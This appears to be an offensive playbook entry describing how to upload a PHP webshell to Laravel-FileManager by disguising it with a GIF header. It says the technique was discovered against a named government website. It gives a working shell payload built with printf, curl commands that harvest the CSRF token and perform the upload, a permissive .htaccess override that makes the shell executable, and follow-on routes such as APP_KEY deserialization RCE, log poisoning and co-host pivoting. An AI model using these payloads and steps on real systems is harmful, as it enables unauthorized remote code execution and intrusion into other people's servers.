# LFM GIF Header Bypass — PHP Upload via Laravel-FileManager

**Discovered:** nactvet.go.tz (2026-06-03)
**Applies to:** Laravel-FileManager (LFM) v2.0+ with MIME-type validation

## The Technique

LFM checks file content MIME type, NOT the file extension. A valid GIF/JPEG/PNG header
at the start of the file passes the `image/*` MIME check, even if the rest of the file
is PHP code. The file is saved with its ORIGINAL extension (`.php`).

## Payload Construction

```bash
# Minimal GIF89a header + PHP webshell (84 bytes, passes as image/gif)
printf 'GIF89a\x10\x00\x10\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\n\x00\x01\x00,\x00\x00\x00\x00\x10\x00\x10\x00\x00\x02\x0e\x84\x8f\xa9\xcb\xed\x0f\xa3\x9c\xb4\xda\x8b\xb3>\x05\x00;<?php system($_GET["c"]); ?>' > shell.gif.php

# Verify it registers as a valid image
file shell.gif.php  # → "GIF image data, version 89a, 16 x 16"
```

## Upload via curl

```bash
# LFM upload endpoint — note type=Images maps to /storage/public/photos/
# type=Files maps to /storage/public/files/
CSRF=$(curl -sk -b cookies.txt "TARGET/new-news-events" | grep -oP 'name="_token" value="\K[^"]+')
curl -sk -b cookies.txt \
  -F "upload=@shell.gif.php;type=image/gif;filename=shell.php" \
  "TARGET/laravel-filemanager/upload?type=Images&_token=$CSRF"
# Response: {"url":".../storage/public/photos/shell.php","uploaded":"..."}
```

## What Works

| Extension | MIME in header | Content check | Result |
|-----------|---------------|---------------|--------|
| `.php` with GIF header | `image/gif` | ✅ Passes | Uploaded |
| `.php` with JPEG header | `image/jpeg` | ✅ Passes | Uploaded |
| `.php` with PNG header | `image/png` | ✅ Passes | Uploaded |
| `.php` (plain PHP, no image header) | `application/octet-stream` | ❌ Rejected | "The image must be an image" |
| `.php\x00.gif` (null byte) | `image/gif` | ❌ Rejected | MIME validation catches null byte |
| `../../../public/shell.php` (path traversal) | `image/gif` | ❌ Sanitized | `../` stripped, saved to normal path |

## The Storage Problem

Files land in `/storage/public/photos/` (Images) or `/storage/public/files/` (Files).
Apache `.htaccess` in `/storage/` directory typically blocks all direct access (403).

**The upload succeeds but the file is not directly executable.**

### .htaccess Subdirectory Bypass (NEW — 2026-06-03)

If LFM returns `"A file with this name already exists!"` when uploading `.htaccess`,
this confirms Apache rules are present. Instead of giving up:

1. **Download** the existing `.htaccess` to understand blocking rules:
   ```bash
   curl -sk -b cookies.txt "TARGET/laravel-filemanager/download?type=Images&file=.htaccess"
   ```

2. **Create a subdirectory** via LFM upload with `working_dir=/rce`:
   ```bash
   curl -sk -b cookies.txt \
     -F "upload=@shell.gif.php;type=image/gif;filename=shell.php" \
     "TARGET/laravel-filemanager/upload?type=Images&_token=CSRF&working_dir=/rce"
   ```

3. **Upload a permissive `.htaccess`** to the subdirectory:
   ```
   Options +Indexes
   <FilesMatch "\\.php$">
   Require all granted
   </FilesMatch>
   ```

4. **Access the shell** at `/storage/public/photos/rce/shell.php?c=id`

Apache processes `.htaccess` per-directory. A subdirectory with its own `.htaccess`
overrides parent rules for requests within that subdirectory.

## Making It Exploitable

The GIF header bypass alone is NOT an RCE — files are trapped in the `/storage/` sandbox.
Combine with one of:

1. **Alternative upload directory** — Profile picture, logo, slider, or favicon upload
   forms often save to paths outside `/storage/` (e.g. `/public/assets/images/upload/`)
   that lack `.htaccess` restrictions. See `references/htaccess-bypass-upload-dirs.md`.

2. **LFM download route** — `/laravel-filemanager/download?type=Images&file=shell.php`
   serves the raw file (HTTP 200, Content-Disposition: attachment) but does NOT execute
   PHP. Useful only for verifying file content exists.

3. **Laravel log poisoning** — If `/storage/logs/laravel.log` is accessible (HTTP 200,
   not 403), PHP code injected via User-Agent appears in the log. But `.log` extension
   is typically not a PHP handler — no execution.

4. **APP_KEY extraction** — If you can read the app's `.env` or config, use APP_KEY
   for Laravel session deserialization RCE. This bypasses the storage block entirely.

5. **Co-host pivot** — If another vhost on the same server has RCE, the storage
   directory is readable from the filesystem level even when Apache blocks HTTP access.

## Verification

After upload, always check:
```bash
# 1. Direct access (expect 403 on hardened targets)
curl -sk "TARGET/storage/public/photos/shell.php?c=id"

# 2. LFM download (expect raw PHP source if accessible)
curl -sk -b cookies.txt "TARGET/laravel-filemanager/download?type=Images&file=shell.php"

# 3. Check if /storage/logs/ is accessible (less restricted than /storage/public/)
curl -sk "TARGET/storage/logs/laravel.log" -o /dev/null -w "%{http_code}"
```
